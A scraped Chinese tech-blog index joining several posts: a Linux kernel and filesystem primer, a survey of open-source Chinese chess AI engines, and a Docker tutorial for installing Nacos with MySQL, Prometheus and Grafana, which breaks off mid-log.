Linux 内核及发行版Linux 内核版本内核（Kernel）是系统的心脏，是运行程序和管理像磁盘和打印机等硬件设备的核心程序，它提供了一个在裸设备与应用程序间的抽象层。Linux 内核源码的官网：https://www.kernel.org，所有来自全世界的对 Linux 源码的修改最终都会汇总到这个网站，由 Linus 领导的开源社区对其进行甄别和修改，最终决定是否进入到 Linux 主线内核源码中。Linux 内核版本又分为稳定版和开发版，两种版本是相互关联，相互循环： 稳定版：具有工业级强度，可以广泛地应用和部署。新的稳定版相对于较旧的只是修正一些 Bug 或加入一些新的驱动程序 开发版：由于要试验各种解决方案，所以变化很快 Linux 发行版本Linux 发行版 (也被叫做 GNU/Linux 发行版) 通常包含了包括桌面环境、办公套件、媒体播放器、数据库等应用软件。这些操作系统通常由 Linux 内核、以及来自 GNU 计划的大量的函式库和基于 X Window 的图形界面组成，在 X Window 中用户同样可以通过使用鼠标对窗口、菜单等进行操作来完成相应的工作。X Window 系统是一个非常出色的图形窗口系统，是类 UNIX 系统的图形用户界面的工业标准，其最重要的特征之一就是它的结构与设备无关。X Window 系统的主要特点如下： X Window 系统是客户端 / 服务端架构的，它的实现是与操作系统内核分开的，其主要由 X Server 和 X Client 两部分组成 X Window 系统不是 Unix/Linux 操作系统的必须的构成部分，而只是一个可选的应用程序组件 附：2014 年与 2015 年最流行的 Linux 发行版的排行榜如下： POSITION 2015 2014 1 Linux Mint Linux Mint 2 Debian Ubuntu 3 Ubuntu Debian 4 openSUSE openSUSE 5 Fedora Fedora 6 Mageia Mageia 7 Manjaro Arch 8 CentOS Elementary 9 Arch CentOS 10 Elementary Zorin Unix/Linux 开发应用领域 Unix/Linux服务器：是目前 Unix/Linux 应用最多的一个领域，可以提供 Web、FTP、Gopher、SMTP/POP3、Proxy/Cache、DNS 等服务器，支持服务器集群，支持虚拟主机、虚拟服务等。 嵌入式 Linux 系统：嵌入式 Linux 是将流行的 Linux 操作系统进行剪裁修改，能够在嵌入式计算机系统上运行的一种操作系统。Linux 嵌入式系统能够支持多种 CPU 和硬件平台，性能稳定，剪裁性好，开发和使用容易，其中包括 Embedix、uCLinux、muLinux 等。 桌面应用：近年来，Linux 系统特别强调在桌面应用方面的改进，目前已经完全可以作为一种集办公应用、多媒体应用、网络应用等多方面功能于一体的图形界面操作系统，在办公应用方面，Unix/Linux 集成了 OpenOffice、SUN 公司的 StarOffice 以及 KOffice 等工具。 电子政务：随着 Linux 的快速发展，Linux 已逐渐成为 Windows 系统重要的竞争力量。尤其是 Linux 在安全性方面的独特优势，又使得 Linux 在政府应用领域得到很大的发展。目前一些国家正将其电子政务系统向 Linux 平台迁移。中国政府也对 Linux 给予极大的支持。 Linux 文件系统目录 目录是一组相关文件的集合 一个目录下面除了可以存放文件之外还可以存放其他目录，即可包含子目录 在确定文件、目录位置时，DOS 和 Unix/Linux 都采用 路径名 + 文件名 的方式，路径反映的是目录与目录之间的关系 路径Unix/Linux 路径由到达定位文件的目录组成。在 Unix/Linux 系统中组成路径的目录分割符为斜杠 /，而 DOS 则用反斜杠 ‘` 来分割各个目录。路径分为绝对路径和相对路径： 绝对路径 绝对路径是从目录树的树根 / 目录开始往下直至到达文件所经过的所有节点目录 下级目录接在上级目录后面用 / 隔开 绝对路径都是从 / 开始的，所以第一个字符一定是 / 相对路径 相对路径是指目标目录相对于当前目录的位置 如果不在当前目录下，则需要使用两个特殊目录 . 和 .. 了，这里的目录 . 指向当前目录，而目录 .. 指向上级目录 一切皆文件Unix/Linux 对数据文件（.mp3、.bmp），程序文件（.c、.h、.o），设备文件（LCD、触摸屏、鼠标），网络文件（Socket）等的管理都抽象为文件，使用统一的方式方法管理。在 Unix/Linux 操作系统中也必须区分文件类型，通过文件类型可以判断文件属于可执行文件、文本文件还是数据文件。值得一提的是，在 Unix/Linux 系统中文件可以没有扩展名，文件名区分大小写。 文件的类型通常，Unix/Linux 系统中常用的文件类型有 5 种：普通文件、目录文件、设备文件、管道文件和链接文件。 普通文件：普通文件是计算机操作系统用于存放数据、程序等信息的文件，一般都长期存放于外存储器（磁盘、磁带等）中。普通文件一般包括文本文件、数据文件、可执行的二进制程序文件等 目录文件：Unix/Linux 系统把目录看成是一种特殊的文件，利用它构成文件系统的树型结构，每个目录文件至少包括两个条目，.. 表示上一级目录，. 表示该目录本身 链接文件：似于 Windows 下的快捷方式，链接又可以分为软链接（符号链接）和硬链接 管道文件：管道文件也是 Unix/Linux 中较特殊的文件类型，这类文件多用于进程间的通信 设备文件：Unix/Linux 系统把每个设备都映射成一个文件，这就是设备文件。它是用于向 I/O 设备提供连接的一种文件，分为字符设备和块设备文件。字符设备的存取以一个字符为单位，块设备的存取以字符块为单位。每一种 I/O 设备对应一个设备文件，存放在 /dev 目录中 文件的权限文件权限就是文件的访问控制权限，即哪些用户和组群可以访问文件以及可以执行什么样的操作。Unix/Linux 系统是一个典型的多用户系统，不同的用户处于不同的地位，对文件和目录有不同的访问权限。为了保护系统的安全性，Unix/Linux 系统除了对用户权限作了严格的界定外，还在用户身份认证、访问控制、传输安全、文件读写权限等方面作了周密的控制。在 Unix/Linux 中的每一个文件或目录都包含有访问权限，这些访问权限决定了谁能访问和如何访问这些文件和目录。 访问用户通过设定权限可以从以下三种访问方式限制访问权限： 只允许用户自己访问（所有者）：所有者就是创建文件的用户，用户是所有用户所创建文件的所有者，用户可以允许所在的用户组能访问用户的文件 允许一个预先指定的用户组中的用户访问：用户组由不同的用户组成，例如，某一类或某一项目中的所有用户都能够被系统管理员归为一个用户组，一个用户能够授予所在用户组的其他成员的文件访问权限 允许系统中的任何用户访问（其他用户）：用户也可以将自己的文件向系统内的所有用户开放，在这种情况下，系统内的所有用户都能够访问用户的目录或文件。在这种意义上，系统内的其他所有用户就是 other 用户类 访问权限用户能够控制一个给定的文件或目录的访问权限，一个文件或目录可能有读、写及执行权限： 读权限（r）：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限 写权限（w）：对文件而言，具有新增、修改、删除文件内容的权限；对目录来说，具有创建、删除、移动目录内文件的权限 可执行权限（x）：对文件而言，具有执行文件的权限；对目录来说，该用户具有进入目录的权限 a) 第 1 个字母代表文件的类型：d 代表文件夹、- 代表普通文件、c 代表硬件字符设备、b 代表硬件块设备、s 表示管道文件、l 代表软链接文件 b) 后 9 个字母依次代表三组权限：文件所有者、用户组、其他用户拥有的权限 第一组权限控制访问自己的文件权限，即所有者权限 第二组权限控制用户组其中一个用户访问文件的权限 第三组权限控制其他所有用户访问文件的权限 c) 这三组权限赋予用户不同类型（即所有者、用户组和其他用户）的读、写及执行权限，这就构成了一共有 9 种类型的权限组 Linux 目录结构说明 /：根目录，一般根目录下只存放目录，在 Linux 下有且只有一个根目录，所有的东西都是从这里开始。当在终端里输入 /home，其实是在告诉系统，先从 /（根目录） 开始，再进入到 home 目录 /bin、/usr/bin: 可执行二进制文件的目录，如常用的命令 ls、tar、mv、cat 等 /boot：放置 Linux 系统启动时用到的一些文件，如 Linux 的内核文件：/boot/vmlinuz，系统引导管理器：/boot/grub /dev：存放 Linux 系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱命令 mount /dev/cdrom /mnt /etc：系统配置文件存放的目录，不建议在此目录下存放可执行文件，重要的配置文件有 /etc/inittab、/etc/fstab、/etc/init.d、/etc/X11、/etc/sysconfig、/etc/xinetd.d /home：系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下，~ 表示当前用户的家目录，~edu 表示用户 edu 的家目录 /lib、/usr/lib、/usr/local/lib：系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助 /lost+fount：系统异常产生错误时，会将一些遗失的片段放置于此目录下 /mnt、/media：光盘默认挂载点，通常光盘挂载于 /mnt/cdrom 下，但也不一定，可以选择任意位置进行挂载 /opt：给主机额外安装软件所摆放的目录 /proc：此目录的数据都在内存中，如系统核心，外部设备，网络状态，由于数据都存放于内存中，所以不占用磁盘空间，比较重要的目录有 /proc/cpuinfo、/proc/interrupts、/proc/dma、/proc/ioports、/proc/net/* /root：系统管理员 root 的家目录 /sbin、/usr/sbin、/usr/local/sbin：放置系统管理员使用的可执行命令，如 fdisk、shutdown、mount 等。与 /bin 不同的是，这几个目录是给系统管理员 root 使用的命令，一般用户只能查看而不能设置和使用 /tmp 一般用户或正在执行的程序临时存放文件的目录，任何人都可以访问，重要数据不可放置在此目录下 /srv：服务启动之后需要访问的数据目录，如网页服务需要访问的网页数据存放在 /srv/www 内 /usr：应用程序存放的目录，例如 /usr/bin 存放应用程序，/usr/share 存放共享数据，/usr/lib 存放不能直接运行的，却是许多程序运行所必需的一些函数库文件，/usr/local 存放软件升级包，/usr/share/doc 系统说明文件存放目录，/usr/share/man 程序说明文件存放目录 /var：放置系统执行过程中经常变化的文件，例如 /var/log：存放随时更改的日志文件，/var/spool/mail：存放邮件的目录，/var/run：程序或服务启动后，其 PID 存放的目录 Windows 和 Linux 文件系统在 Windows 平台下，打开 计算机 界面，可以看到的是一个个的驱动器盘符，而每个驱动器都有自己的根目录结构，这样形成了多颗树并列的情形，如下图所示： 在 Linux 下，是看不到这些驱动器盘符，看到的只有文件夹（目录）。在早期的 UNIX 系统中，各个厂家各自定义了自己的 UNIX 系统文件目录，比较混乱。Linux 面世不久后，对文件目录进行了标准化，于 1994 年对根文件目录做了统一的规范，推出 FHS（Filesystem Hierarchy Standard）的 Linux 文件系统层次结构标准。FHS 标准规定了 Linux 根目录各文件夹的名称及作用，统一了 Linux 界命名混乱的局面。和 Windows 操作系统类似，所有 Unix/Linux 的数据都是由文件系统按照树型目录结构管理的，而且 Unix/Linux 操作系统同样要区分文件的类型，判断文件的存取属性和可执行属性。但 Unix/Linux 文件系统不使用驱动器这个概念，而是使用单一的根目录结构，所有的分区都挂载到单一的 / 目录上，其结构示意图如下图所示： var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux系统编程"},{title:"中国象棋之二开源 AI 引擎介绍",url:"/posts/26ffa5e3.html",text:'上篇 中国象棋之一 Linux 下的象棋软件 GMChess 前言本文将介绍针对中国象棋的开源 AI 引擎，旨在对希望打造自己的中国象棋引擎的开发者提供一点帮助。目前中国象棋 AI 引擎主要分为两类，第一类是传统的象棋 AI 引擎（如象棋名手、象棋旋风），属于 CPU 密集计算型的引擎；第二类则是基于 Alpha-Zero 深度强化学习算法的新兴 AI 引擎，属于 GPU 密集计算型的引擎。由于谷歌的 DeepMind Alpha-Zero 已经 “通杀” 围棋、国际象棋、日本将棋，因此第二类中国象棋 AI 引擎非常值得关注。 开源象棋引擎HarmlessHarmless 是一款 Linux 下的中国象棋引擎，在普通机器上限定每步 6 秒时间的情况下，平均搜索深度在 5-8 层左右。核心搜索主要采用的是极小窗口搜索，并结合了哈希表技术和历史启发；评估函数则相对实现得比较简单，只考虑了棋子本身的价值和棋子间的灵活度，虽不靠谱，但基本能用。引擎部分完全用 C 语言实现，支持部分 UCCI 通信协议，并附带了一个简单的图形界面，运行环境依赖 Python-2.7.x 与 Pygame-1.9.x。附上原作者对该项目的博客分享：写了一个 Linux 下的中国象棋引擎。 UCCI-ChessEnginesUCCI-ChessEngines 是中国象棋 UCCI 引擎源码的整理，引擎包括 ElephantEye（象眼）、 BitStronger、Eleeye、Mars、梦入神蛋 MRSD2（浅红引擎） ChineseChess-EnginesChineseChess-Engines 是基于 UCCI-ChessEngines 项目，整理了中国象棋 UCCI 引擎的源码，在原基础上做了大量修改，使其支持在 Linux 上运行，修改内容如下： 增加了 Harmless 象棋引擎，Ubuntu 编译通过，支持 UCCI BitStronger：增加了 makefile, Ubuntu 编译通过，支持 UCCI ElephantEye（象眼）：增加了 makefile, Ubuntu 编译通过，支持 UCCI Mars：修改了相关代码，更改了编码方式为 UTF-8，增加了 makefile，Ubuntu 编译通过，支持 UCCI 梦入神蛋 MRSD2（浅红引擎）：修改了相关代码，更改了编码方式为 UTF-8，修改了 makefile，Ubuntu 编译通过，不支持 UCCI cchess-zerocchess-zero 是基于 Alpha-Zero 的实践项目，实现了一个中国象棋程序，使用 TensorFlow1.0 和 Python3.5 开发。附上原作者对该项目的博客分享：Alpha-Zero 实践 — 中国象棋（附论文翻译）。 icyChessZeroicyChessZero 受到 Alpha-Zero 的启发，旨在训练一个中等人类水平或高于中等人类水平的深度神经网络，来完成下中国象棋的任务。目前该项目仍然没有完成全部的开发，处于停滞状态。附上原作者对该项目的博客分享：一个分布式中国象棋 Alpha Zero。 CCZeroCCZero 的目标是将 Alpha-Zero 的算法应用到了中国象棋上，旨在借助广大象棋爱好者之力一起训练出一个可以打败旋风名手的 “象棋之神”。因为种种原因，这个目标截止 2018/11/07 为止仍未能实现，或者说还差得远，而且跑谱的人也越来越少了，作者已经放弃该项目。附上原作者对该项目的博客分享：中国象棋 Zero 技术详解。 GGzeroGGzero 采用了谷歌 DeepMind 公司提出的 Alpha-Zero 深度强化学习算法，基于国际象棋引擎 leela-chess 进行开发，是目前世界上首款达到商业引擎水平的显卡加速象棋引擎。GGzero 项目是一个团队在维护，创作者是佳佳象棋的作者李国来；目前就 Elo 分来说是最强的，但发展状况逐渐呈现商业化趋势（作者没有公开发布最新的代码），更多资料可在社区论坛上获取。值得一提的是，GGzero 曾获得第三届楚河汉界象棋人工智能大赛第三名，2019 年北京人工智能大赛并列第二名，比赛规则与机器配置如下： 赛制用时：10 分钟 + 3 秒 其它商业引擎的机器配置：Xeon 2696 V4（44 核心），有开局库，有残局库 GGzero 的机器配置：Nvidia GeForce RTX 2070 Super X 4，无开局库，无残局库 中国象棋引擎排行榜 第一阵营：象棋名手、象棋旋风 第二阵营：小虫象棋、天机象棋、Alpha 猫、佳佳象棋、南奥象棋 第三阵营：UFX、象棋天启 其他棋类的开源 AI 引擎 围棋（leela-zero） 黑白棋（reversi-alpha-zero） 国际象棋（chess-alpha-zero） 五子棋（AlphaZero-Gomoku） 参考资料 象棋百科 中国象棋 AI 实现 28 天自制你的 AlphaGo（3）：训练策略网络，真正与之对弈 下篇 中国象棋之三 ElephantEye 引擎深入理解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开源"},{title:"Docker 安装 Nacos 单机和集群",url:"/posts/961beae9.html",text:"前言本文主要介绍如何使用 Docker 安装并管理 Nacos 的镜像和容器，涉及到 Nacos 单机版与集群版的安装，并连接上 MySQL 数据库，同时还会介绍 Prometheus 与 Grafana 监控系统的使用。 1.0、软件环境 CentOS 7.9 Docker 20.10.1 Docker-Compose 1.24.0-rc1 Nacos 1.4.0（截止目前最新的版本） 1.1、快速启动单机模式快速启动 Nacos，使用嵌入式数据库 1# docker run --name nacos-standalone-embedded -e MODE=standalone -p 8848:8848 -d nacos/nacos-server:latest 单机模式快速启动 Nacos，使用 MySQL 数据库 1234567891011121314151617# docker run -d \\-e MODE=standalone \\-e SPRING_DATASOURCE_PLATFORM=mysql \\-e MYSQL_SERVICE_HOST=ip \\-e MYSQL_SERVICE_PORT=3306 \\-e MYSQL_SERVICE_USER=nacos \\-e MYSQL_SERVICE_PASSWORD=nacos \\-e MYSQL_SERVICE_DB_NAME=nacos_devtest \\-p 8848:8848 \\--restart=always \\--name nacos-standalone-mysql \\nacos/nacos-server:latest## 特别注意：## 1) MySQL 数据库必须是已经初始化过的，即已经创建好 Nacos 运行所需的数据库表## 2) MySQL 的 IP 必须是在 Nacos 容器内部可以直接访问到的 IP，一般情况下不能直接使用 `127.0.0.1`## 3) 若 MySQL 不是运行在 Docker 容器内，而是直接安装在外网或者宿主机内，可以指定 `--net=host` 参数让 Nacos 容器共享宿主机的网络 1.2、Clone Nacos 项目1234567891011# 拉取Nacos项目的源码$ git clone https://github.com/alibaba/nacos# 后面会使用 nacos-mysql.sql 来初始化MySQL数据库$ tree nacos/distribution/conf├── application.properties├── application.properties.example├── cluster.conf.example├── nacos-mysql.sql├── nacos-logback.xml└── schema.sql 1.3、Clone Nacos Docker 项目12345678910111213141516171819202122232425262728293031323334353637# 拉取Nacos Docker项目的源码$ git clone https://github.com/nacos-group/nacos-docker.git# 进入项目目录$ cd nacos-docker# 目录结构$ tree├── build│&nbsp;&nbsp; ├── bin│&nbsp;&nbsp; │&nbsp;&nbsp; └── docker-startup.sh│&nbsp;&nbsp; ├── conf│&nbsp;&nbsp; │&nbsp;&nbsp; └── application.properties│&nbsp;&nbsp; ├── Dockerfile│&nbsp;&nbsp; └── init.d│&nbsp;&nbsp; └── custom.properties├── changlog├── env│&nbsp;&nbsp; ├── mysql.env│&nbsp;&nbsp; ├── nacos-embedded.env│&nbsp;&nbsp; ├── nacos-hostname.env│&nbsp;&nbsp; ├── nacos-ip.env│&nbsp;&nbsp; └── nacos-standlone-mysql.env├── example│&nbsp;&nbsp; ├── cluster-embedded.yaml│&nbsp;&nbsp; ├── cluster-hostname.yaml│&nbsp;&nbsp; ├── cluster-ip.yaml│&nbsp;&nbsp; ├── init.d│&nbsp;&nbsp; │&nbsp;&nbsp; └── custom.properties│&nbsp;&nbsp; ├── prometheus│&nbsp;&nbsp; │&nbsp;&nbsp; ├── prometheus-cluster.yaml│&nbsp;&nbsp; │&nbsp;&nbsp; └── prometheus-standalone.yaml│&nbsp;&nbsp; ├── standalone-derby.yaml│&nbsp;&nbsp; ├── standalone-mysql-5.7.yaml│&nbsp;&nbsp; └── standalone-mysql-8.yaml├── README.md└── README_ZH.md 目录结构说明： example：Docker-Compose 编排示例 example/init.d：启动 Nacos 容器时的自定义配置（应用级别），例如 Metrics 监控相关的内容 build：用于构建 Nacos 镜像的源码，包括配置文件、Shell 脚本与 Dockerfile env：Docker-Compose 的环境变量文件，例如定义 MySQL 数据库的用户名、密码和端口号、Nacos 集群各节点的 IP Nacos 单机模式启动2.0、Nacos 监控关闭在 Nacos 官方的 Docker 项目里，Nacos 单机版（Derby、MySQL 5.7）默认集成了 Prometheus 与 Grafana 监控。即在 example/standalone-xxx.yaml 配置文件里，除了已经配置了 Nacos 的镜像，还配置了 Prometheus、Grafana 作为监控系统。如果不需要监控 Nacos，可以删除对应的配置内容，具体操作如下： 1）配置 Nacos 不暴露 Metrics 数据 123# 编辑Properties配置文件$ vim example/init.d/custom.propertiesmanagement.endpoints.web.exposure.include=* #注释掉这行内容，注释后访问\"http://{ip}:8848/nacos/actuator/prometheus\" 不会再看到Metrics数据 2）删除 Prometheus、Grafana 的 Docker-Compose 配置 12345678910111213141516171819# 编辑YAML配置文件，删除以下内容$ vim example standalone-derby.yamlprometheus: container_name: prometheus image: prom/prometheus:latest volumes: - ./prometheus/prometheus-standalone.yaml:/etc/prometheus/prometheus.yml ports: - \"9090:9090\" depends_on: - nacos restart: on-failuregrafana: container_name: grafana image: grafana/grafana:latest ports: - 3000:3000 restart: on-failure 2.1、Nacos + Derby单机模式启动 Nacos 容器，默认使用的是嵌入式数据库 Derby 12345# 创建并前台启动容器# docker-compose -f example/standalone-derby.yaml up# 或者创建并后台启动容器# docker-compose -f example/standalone-derby.yaml up -d Docker-Compose 常用的容器管理命令，后面创建的所有容器都可以这样管理，不再累述。 1234567891011# 查看容器的运行状态# docker-compose -f example/standalone-derby.yaml ps# 启动容器# docker-compose -f example/standalone-derby.yaml start# 停止容器# docker-compose -f example/standalone-derby.yaml stop# 停止并删除容器，包括网络、数据卷（特别注意，此操作会删除所有容器的数据，且不可恢复）# docker-compose -f example/standalone-derby.yaml down 2.2、Nacos + MySQL 5.7单机模式启动 Nacos 容器，数据库使用的是 MySQL 5.7，这里需要手动执行 MySQL 数据库初始化操作，否则 Nacos 启动时会抛出 No DataSource set 异常，导致无法连接上 MySQL 数据库 12345# 创建并前台启动容器# docker-compose -f example/standalone-mysql-5.7.yaml up# 或者创建并后台启动容器# docker-compose -f example/standalone-mysql-5.7.yaml up -d 2.3、Nacos + MySQL 8单机模式启动 Nacos 容器，数据库使用的是 MySQL 8，这里需要手动执行 MySQL 数据库初始化操作，否则 Nacos 启动时会抛出 No DataSource set 异常，导致无法连接上 MySQL 数据库 12345# 创建并前台启动容器# docker-compose -f example/standalone-mysql-8.yaml up# 或者创建并后台启动容器# docker-compose -f example/standalone-mysql-8.yaml up -d 2.4、Nacos 单机模式测试2.4.1、调用 OPEN API1234567891011# 发布配置$ curl -X POST \"http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=helloWorld\"# 获取配置$ curl -X GET \"http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test\"# 服务注册$ curl -X POST 'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080'# 服务发现$ curl -X GET 'http://127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.naming.serviceName' 2.4.2、访问 Nacos 的控制台浏览器访问 http://127.0.0.1:8848/nacos，打开 Nacos 的控制台 Nacos 集群模式启动Nacos 的集群模式需要依赖 MySQL 数据库（集中式存储），因此在集群模式下不能再使用 Nacos 自带的嵌入式数据库 Derby。在 Nacos 官方的 Docker 项目中，以集群模式启动 Nacos，默认使用的是单个 MySQL 数据库。值得一提的是，从 Nacos 1.1.4 镜像开始，后续所有镜像都已经移除了主从镜像相关属性的配置。由于在 Nacos 的生产环境中，MySQL 至少需要主备模式，或者采用高可用数据库；因此如果需要配置 MySQL 主从库，需要自行实现（如搭建 DB-Proxy）。 3.0、Nacos + MySQL 5.7基于 HostName，集群模式启动 Nacos 容器，数据库使用的是 MySQL 5.7（单机），这里需要手动执行 MySQL 数据库初始化操作，否则 Nacos 启动时会抛出 No DataSource set 异常，导致无法连接上 MySQL 数据库 12345# 创建并前台启动容器# docker-compose -f example/cluster-hostname.yaml up# 或者创建并后台启动容器# docker-compose -f example/cluster-hostname.yaml up -d 基于 IP，集群模式启动 Nacos 容器，数据库使用的是 MySQL 5.7（单机），这里需要手动执行 MySQL 数据库初始化操作，否则 Nacos 启动时会抛出 No DataSource set 异常，导致无法连接上 MySQL 数据库 12345# 创建并前台启动容器# docker-compose -f example/cluster-ip.yaml up# 或者创建并后台启动容器# docker-compose -f example/cluster-ip.yaml up -d 查看 Nacos 的日志文件，若日志信息如下显示，则说明 Nacos 是以集群模式启动的 12345678# tail -n 20 example/cluster-logs/nacos1/nacos.log# tail -n 20 example/cluster-logs/nacos2/nacos.log# tail -n 20 example/cluster-logs/nacos3/nacos.log2020-03-12 21:20:17,866 INFO Nacos started successfully in cluster mode. use external storage2020-03-12 21:20:18,117 INFO Initializing Spring DispatcherServlet 'dispatcherServlet'2020-03-12 21:20:18,117 INFO Initializing Servlet 'dispatcherServlet'2020-03-12 21:20:18,141 INFO Completed initialization in 23 ms 3.1、Nacos 集群模式测试3.1.1、调用 OPEN API1234567891011# 发布配置$ curl -X POST \"http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=helloWorld\"# 获取配置$ curl -X GET \"http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test\"# 服务注册$ curl -X POST 'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080'# 服务发现$ curl -X GET 'http://127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.naming.serviceName' 3.1.2、访问 Nacos 的控制台浏览器访问 http://127.0.0.1:8848/nacos，打开 Nacos 的控制台；若 Nacos 集群启动成功，可以看到多个 Nacos 节点，Docker 的映射端口分别是 8848、8849、8850 Prometheus 与 Grafana 监控在 Nacos 官方的 Docker 项目里，Nacos 单机版（Derby、MySQL 5.7）默认集成了 Prometheus 与 Grafana 监控，一般情况下开箱即用。 4.0、创建并启动容器12# 创建并后台启动容器# docker-compose -f example/standalone-mysql-5.7.yaml up -d 4.1、调用 OPEN API为了让 Prometheus 与 Grafana 的监控面板有数据可显示，调用 OPEN API 插入模拟数据 12345# 发布配置$ curl -X POST \"http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=helloWorld\"# 服务注册$ curl -X POST 'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080' 4.2、访问 Prometheus 的控制台 1）浏览器访问 http://127.0.0.1:9090/graph，打开 Prometheus 的控制台，查看 Prometheus 采集到的 Nacos Metrics 数据 2）在搜索栏搜索 nacos_monitor，若可以搜索到 Nacos 的数据，则说明 Prometheus 采集数据成功 3）若 Prometheus 采集不到数据，浏览器访问 http://{ip}:8848/nacos/actuator/prometheus，看能不能获取到 Nacos 的 Metrics 数据 4.3、访问 Grafana 的控制台 1）下载 Nacos 的 Grafana 监控模版文件 1234567891011# 拉取Nacos Template项目的源码$ git clone https://github.com/nacos-group/nacos-template# 后面要用到 nacos-grafana.json 监控模版文件# tree -N├── nacos-grafana.json├── nacos-sync-grafana├── README.md├── 方案评审内容模板.md├── 模板-Nacos（微软黑体）.ppt└── 模板-Nacos（微软黑体）新版本.key 2）浏览器访问 http://127.0.0.1:3000，默认登录的用户名和密码为 admin/admin，首次登录会提示重新设置新密码 3）创建 Prometheus 数据源 特别注意：Grafana 创建 Prometheus 新数据源时，数据源名称（区分英文大小写）必须是 prometheus，数据源地址必须是 http://prometheus:9090，否则会获取不到监控数据或者提示 Gateway 相关的错误信息 4）导入 Nacos 的 Grafana 监控模版文件 nacos-grafana.json 5）Nacos Grafana 展示的核心监控项 Docker 部署问题汇总5.0、MySQL 启动失败发现 MySQL 容器启动失败 1234567# 查看容器的运行状态$ docker-compose -f example/standalone-mysql-5.7.yaml psgrafana /run.sh Up 0.0.0.0:3000-&gt;3000/tcpmysql docker-entrypoint.sh mysqld Exit 1nacos-standalone-mysql bin/docker-startup.sh Up 0.0.0.0:8848-&gt;8848/tcp, 0.0.0.0:9555-&gt;9555/tcpprometheus /bin/prometheus --config.f ... Up 0.0.0.0:9090-&gt;9090/tcp 查看 MySQL 的日志信息，发现可能是 MySQL 首次启动时生成相关证书（登录）失败导致 1234567891011121314151617181920212223242526272829# 查看容器的运行状态$ docker-compose -f example/standalone-mysql-5.7.yaml logs mysqlmysql | Database initializedmysql | Initializing certificatesmysql | Generating a RSA private keymysql | ..+++++mysql | ..................................+++++mysql | unable to write 'random state'mysql | writing new private key to 'ca-key.pem'mysql | -----mysql | Generating a RSA private keymysql | .......................+++++mysql | ......+++++mysql | unable to write 'random state'mysql | writing new private key to 'server-key.pem'mysql | -----mysql | Generating a RSA private keymysql | ..............................................................+++++mysql | ...............+++++mysql | unable to write 'random state'mysql | writing new private key to 'client-key.pem'mysql | -----mysql | mysql_ssl_rsa_setup: Can't change permissions of the file 'ca-key.pem' (Errcode: 1 - Operation not permitted)mysql | 2020-03-12 22:13:39 [ERROR] Error setting file permissions forca-key.pem and ca.pemmysql | mysql_ssl_rsa_setup: Can't change permissions of the file 'server-key.pem' (Errcode: 1 - Operation not permitted)mysql | 2020-03-12 22:13:39 [ERROR] Error setting file permissions forserver-key.pem and server-cert.pemmysql | mysql_ssl_rsa_setup: Can't change permissions of the file 'client-key.pem' (Errcode: 1 - Operation not permitted)mysql | 2020-03-12 22:13:39 [ERROR] Error setting file permissions forclient-key.pem and client-cert.pem 关闭所有容器，然后再重启所有容器，至此 MySQL 容器可以正常启动 12345678910111213# 关闭所有容器# docker-compose -f example/standalone-mysql-5.7.yaml stop# 启动所有容器# docker-compose -f example/standalone-mysql-5.7.yaml start# 查看容器的运行状态$ docker-compose -f example/standalone-mysql-5.7.yaml psgrafana /run.sh Up 0.0.0.0:3000-&gt;3000/tcpmysql docker-entrypoint.sh mysqld Up 0.0.0.0:3309-&gt;3306/tcp, 33060/tcpnacos-standalone-mysql bin/docker-startup.sh Up 0.0.0.0:8848-&gt;8848/tcp, 0.0.0.0:9555-&gt;9555/tcpprometheus /bin/prometheus --config.f ... Up 0.0.0.0:9090-&gt;9090/tcp 5.1、Nacos 启动失败5.1.1、原因分析容器虽然都启动成功了，但浏览器无法访问 http://127.0.0.1:8848/nacos，查看 Nacos 的日志文件，发现有 No DataSource set 相关的异常信息，也就是 Nacos Server 无法正常连接到 MySQL 数据库 1234567891011# 查看Nacos的日志文件$ tail -n 20 example/standalone-logs/nacos.logCaused by: java.lang.IllegalStateException: No DataSource set at org.springframework.util.Assert.state(Assert.java:73) at org.springframework.jdbc.support.JdbcAccessor.obtainDataSource(JdbcAccessor.java:77) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:371) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:452) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:462) at org.springframework.jdbc.core.JdbcTemplate.queryForObject(JdbcTemplate.java:473) at 